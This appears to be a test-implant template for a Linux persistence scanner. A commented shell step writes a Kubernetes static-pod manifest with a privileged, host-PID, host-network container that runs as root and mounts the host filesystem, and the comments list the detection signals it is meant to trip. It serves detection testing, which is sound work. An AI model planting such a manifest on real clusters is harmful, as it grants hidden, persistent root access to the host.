# Implant template: k8s-static-attacker-pod (L2, armed)
#
# T1543.005 (Container Service). Drops a Pod manifest in
# /etc/kubernetes/manifests/, the default kubelet pod-manifest-path.
# kubelet polls this directory and runs every Pod it finds as a
# privileged container with hostPID + hostNetwork + privileged
# securityContext — a textbook root-on-host persistence pivot that
# survives apiserver downtime because static pods bypass the API.
#
# The image string is deliberately unqualified (no registry host,
# no version tag): a single token like "${image}" with neither a
# registry prefix nor a "@sha256:" digest. That trips the
# k8sstatic module's unqualified_exec_target signal — the same
# signal cron / systemd already emit for "exec_target with no
# leading slash".
#
# linpersist's k8sstatic module emits one k8s.static-pod record
# with ExecTarget = image string. Signals:
#   - recent_mtime_7d           (manifest freshly written)
#   - non_package_path          (always: pod manifests aren't
#                                package-managed)
#   - unqualified_exec_target   (no registry / no tag)
# No bespoke detection rule for k8s.static-pod exists yet; implant
# surfaces via Q1 (singleton content hash). A candidate rule
# `k8s_static_pod_unqualified_image` would be the natural Q7 hook
# once the catalog of benign pod manifests across k8s-cp hosts is
# wider than the kube-system baseline.
#
# Variables: ${manifest_file}, ${pod_name}, ${image}, ${namespace}

RUN mkdir -p /etc/kubernetes/manifests && \
    printf '%s\n' \
        'apiVersion: v1' \
        'kind: Pod' \
        'metadata:' \
        '  name: ${pod_name}' \
        '  namespace: ${namespace}' \
        'spec:' \
        '  hostPID: true' \
        '  hostNetwork: true' \
        '  containers:' \
        '  - name: ${pod_name}' \
        '    image: ${image}' \
        '    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]' \
        '    securityContext:' \
        '      privileged: true' \
        '      runAsUser: 0' \
        '    volumeMounts:' \
        '    - name: host-root' \
        '      mountPath: /host' \
        '  volumes:' \
        '  - name: host-root' \
        '    hostPath:' \
        '      path: /' \
        > ${manifest_file} && \
    chown root:root ${manifest_file} && \
    chmod 0644 ${manifest_file}
